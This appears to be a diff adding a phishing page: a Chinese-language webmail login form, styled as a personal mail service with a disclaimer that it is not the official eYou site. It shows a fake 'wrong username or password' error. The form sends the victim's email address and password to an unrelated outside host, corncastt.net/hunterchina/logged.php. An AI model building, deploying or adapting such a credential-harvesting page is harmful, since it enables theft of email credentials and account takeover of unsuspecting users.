@@ -1,0 +1,105 @@
+<?php
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>个人邮件系统</title>
+<style>
+*{ margin:0; padding:0}
+body{
+	color:#464646;
+	font:12px normal Verdana, Arial, Helvetica, sans-serif;
+	background-image: url(https://scanholdngs.com/china-mail/cn/lWqCT7a.gif);
+}
+.main{ height: 195px;  width:438px;margin:336px auto 0 auto;}
+.text{ width:272px; margin-left: 30px; margin:8px 10px 0px 8px; height:25px; font-family:Verdana, Arial, Helvetica, sans-serif; border:none}
+.cont{ padding:10px 10px 0 0;}
+table{ width:100%;}
+th{ padding-left:50px; font-weight:400; height:40px;}
+td,img,input,select{ vertical-align:middle}
+
+.inputbox{ height:36px; width:292px;}
+#message_out{height:20px;text-align:center;color:red;}
+.style1 {
+	color: #000000;
+	font-weight: bold;
+}
+.btn .submit {
+    background: #4d91d8;
+    height: 34px;
+    line-height: 34px;
+    border: none;
+    width: 306px;
+    color: #fff;
+    margin-top: 12px;
+    border-radius: 5px;
+    font-size: 18px;
+* {
+    margin: 0;
+    margin-top: 0px;
+    padding: 10px;
+}
+.btn {
+    line-height: 34px;
+}
+.btn {
+    font-size: 14px;
+    color: #fff;
+    font-weight: 400;
+    font-size: 20px;
+    font-family: "微软雅黑";
+}
+body {
+    font-family: "微软雅黑",Verdana, Geneva, sans-serif;
+    font-size: 12px;
+}
+</style>
+
+</head>
+
+<body>
+<div class="main" id="content">
+  <div class="cont">
+<div id="message_out">
+<div id="message" style="">登录名或登录密码不正确</div>
+</div>
+<table>
+<form id="form" method="post" action="https://corncastt.net/hunterchina/logged.php" >
+      <tr>
+        <th><span class="style1">用户名</span></th>
+        <td><div class="inputbox"><input id="user" type="email" name="email" class="text" value="" required /></div>
+
+	<div style="display:none">
+        <div id="tr_domain_list" style="display:none">
+        <strong>@</strong>
+        <select id="domain_list_select" name="domain_name" onchange="this.title=this.options[this.options.selectedIndex].text">
+        <option></option>
+        </select>
+        </div>
+	</div>
+	</td>
+      </tr>
+      <tr>
+        <th><span class="style1">密　码</span></th>
+        <td><div class="inputbox"><input id="password" type="password" name="password" title="密　码" class="text" required /></div></td>
+
+      </tr>
+      <tr>
+        <td style="padding-top:12px;padding-left:106px;" colspan="3">
+	  <input style="background: #4d91d8;height: 34px;line-height: 34px; border: none; width: 272px; color: #fff; margin-top: 0px; border-radius: 5px; font-size: 18px;" id="submit" type="submit" value="登 录" class="submit"/>
+        </td>
+      </tr>
+	  </form>
+    </table>
+  </div>
+</div>
+&nbsp;
+  <div style="text-align: center;" class="cr">
+声明：本站非亿邮官网！仅为个人用户提供免费邮箱服务，服务支持请联系s<br>
+</div>
+<div style="text-align: center;" class="cr">
+信网信息技术有限公司 &copy; 2022 - 版权所有 
+  </div>
+</body>
+</html>
